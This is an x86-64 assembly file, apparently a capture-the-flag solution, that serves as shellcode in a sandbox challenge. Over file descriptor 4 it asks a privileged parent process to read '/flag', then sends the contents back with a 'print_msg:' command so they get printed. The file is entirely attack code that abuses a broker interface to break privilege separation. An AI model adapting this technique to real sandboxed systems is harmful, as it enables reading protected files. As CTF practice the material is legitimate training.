.intel_syntax noprefix

.section .text
.global _start

_start:
    # write(4, "read_file:/flag\0", 50)
    mov rdi, 4
    lea rsi, [rip+read]
    mov rdx, 50
    mov rax, 1
    syscall

    # read(4, 0x133710a, 0x100)
    mov rdi, 4
    mov rsi, 0x133710a
    mov rdx, 0x100
    mov rax, 0
    syscall

    # add the prefix "print_msg:" to the flag in memory
    xor rbx, rbx
    mov rcx, 0x1337100
    lea rdx, [rip+print]
load_cmd:
    lea rdi, [rcx+rbx]
    mov al, byte ptr [rdx+rbx]
    mov [rdi], al
    add rbx, 1
    cmp rbx, 10
    jl load_cmd

    # send command "print_msg:[flag_content]" to the parent process
    # write(4, 0x1337100, 0x100)
    mov rdi, 4
    mov rsi, 0x1337100
    mov rdx, 0x100
    mov rax, 1
    syscall
    jmp eof
read:
    .ascii "read_file:/flag\0"
print:
    .ascii "print_msg:"
eof:
    nop
